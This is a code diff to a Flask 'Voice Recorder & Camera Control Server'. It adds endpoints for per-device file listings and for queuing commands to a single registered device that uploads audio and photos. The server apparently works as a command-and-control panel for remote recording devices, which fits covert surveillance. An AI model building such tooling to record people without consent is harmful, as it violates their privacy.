@@ -197,6 +197,49 @@ def get_files():
         print(f"❌ Get files error: {e}")
         return jsonify({'files': []})
 
+# Get device-specific files
+@app.route('/get_device_files/<device_id>', methods=['GET'])
+def get_device_files(device_id):
+    try:
+        device_files = [f for f in uploaded_files if f['device_id'] == device_id]
+        sorted_files = sorted(device_files, key=lambda x: x['upload_time'], reverse=True)
+        
+        # Check if files exist on disk
+        valid_files = []
+        for file_info in sorted_files:
+            file_path = os.path.join(UPLOAD_FOLDER, file_info['filename'])
+            if os.path.exists(file_path):
+                valid_files.append(file_info)
+                
+        return jsonify({'files': valid_files})
+    except Exception as e:
+        print(f"❌ Get device files error: {e}")
+        return jsonify({'files': []})
+
+# Get specific device details
+@app.route('/get_device/<device_id>', methods=['GET'])
+def get_device_details(device_id):
+    try:
+        if device_id in connected_devices:
+            device_data = connected_devices[device_id].copy()
+            
+            # Get device-specific files
+            device_files = [f for f in uploaded_files if f['device_id'] == device_id]
+            device_photos = [f for f in device_files if f.get('type') == 'photo']
+            device_audios = [f for f in device_files if f.get('type') == 'audio']
+            
+            return jsonify({
+                'status': 'success',
+                'device': device_data,
+                'files_count': len(device_files),
+                'photos_count': len(device_photos),
+                'audios_count': len(device_audios)
+            })
+        return jsonify({'status': 'error', 'message': 'Device not found'}), 404
+    except Exception as e:
+        print(f"❌ Get device details error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 # Delete file endpoint
 @app.route('/delete_file/<filename>', methods=['DELETE'])
 def delete_file(filename):
@@ -260,7 +303,7 @@ def get_commands(device_id):
         print(f"❌ Get commands error: {e}")
         return jsonify({'commands': []})
 
-# Send command to device
+# Send command to all devices
 @app.route('/send_command', methods=['POST'])
 def send_command():
     try:
@@ -293,6 +336,36 @@ def send_command():
             'command': command,
             'devices_count': sent_count
         })
+
+    except Exception as e:
+        print(f"❌ Send command error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Send command to specific device only
+@app.route('/send_command_to_device', methods=['POST'])
+def send_command_to_device():
+    try:
+        command = request.json.get('command')
+        device_id = request.json.get('device_id')
+
+        print(f"📨 Received command '{command}' for specific device '{device_id}'")
+
+        if not command or not device_id:
+            return jsonify({'status': 'error', 'message': 'No command or device ID provided'})
+
+        if device_id in commands_queue:
+            commands_queue[device_id].append(command)
+            print(f"✅ Command '{command}' sent to device '{device_id}'")
+            
+            return jsonify({
+                'status': 'command_sent', 
+                'command': command,
+                'device_id': device_id,
+                'message': f'Command sent to {device_id}'
+            })
+        else:
+            print(f"❌ Device '{device_id}' not found")
+            return jsonify({'status': 'error', 'message': 'Device not found'}), 404
 
     except Exception as e:
         print(f"❌ Send command error: {e}")
@@ -345,7 +418,7 @@ def get_devices():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f'🚀 Starting Voice Recorder & Camera Control Server...')
+    print(f'🚀 Starting Multi-Device Voice Recorder & Camera Control Server...')
     print(f'📡 Web Panel: http://0.0.0.0:{port}')
     print('📍 Available Endpoints:')
     print('   - GET  /')
@@ -354,10 +427,13 @@ if __name__ == '__main__':
     print('   - POST /upload_photo (photo upload)')
     print('   - GET  /file/<filename>')
     print('   - GET  /get_files')
+    print('   - GET  /get_device_files/<device_id>')
+    print('   - GET  /get_device/<device_id>')
     print('   - DELETE /delete_file/<filename>')
     print('   - POST /register_device')
     print('   - GET  /get_commands/<device_id>')
     print('   - POST /send_command')
+    print('   - POST /send_command_to_device')
     print('   - POST /update_status')
     print('   - GET  /get_devices')
     print('⏹️  Press Ctrl+C to stop')
